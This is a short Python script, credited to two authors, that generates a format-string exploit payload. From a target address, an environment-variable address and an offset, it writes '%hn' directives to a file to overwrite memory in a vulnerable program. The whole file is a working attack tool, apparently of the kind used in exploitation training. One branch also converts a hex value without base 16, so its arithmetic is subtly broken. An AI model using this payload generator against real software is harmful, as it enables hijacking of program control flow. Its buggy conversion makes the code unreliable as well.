#fs_envy.py
# by TrustArgon & tjnull

#!/usr/bin/env python
import struct
import sys
if len(sys.argv) != 4 :
        print("[*] Usage: " + sys.argv[0] + " <TARGET ADDR> <ENV ADDR> <OFFSET> \n")
        print("[-]example: " + sys.argv[0] + " 0xffffdeec 0x080567ac 6 \n\n")
        sys.exit()
else:
        memory_location = int(sys.argv[1][2:],16)
        address = struct.pack( "<I", memory_location + 2)
        address2 = struct.pack( "<I", memory_location)

        outfile = "test.txt"

        f = open(outfile,"w")
        env_addr = [(sys.argv[2][2:][i:i+4]) for i in range (0, len(sys.argv[2][2:]), 4)] # Holy Shit batman
        hob = env_addr[0]
        lob = env_addr[1]
        offset_arg = sys.argv[3]
        if hob < lob:
                number=int(hob,16)-8
                number2=int(lob,16)-int(hob)
                offset = int(offset_arg)
                offset2 =int(offset_arg) + 1
        else:
                number=int(lob,16)-8
                number2=int(hob,16)-int(lob,16)
                offset= int(offset_arg) +1
                offset2= int(offset_arg)
        d = ''
        payload = d.join([address, address2, "%", str(number), 'c%', str(offset), '$hn%', str(number2), 'c%', str(offset2), '$hn','\n'])
        f.write(payload)
        f.close()
        print("Output saved to: " + outfile)
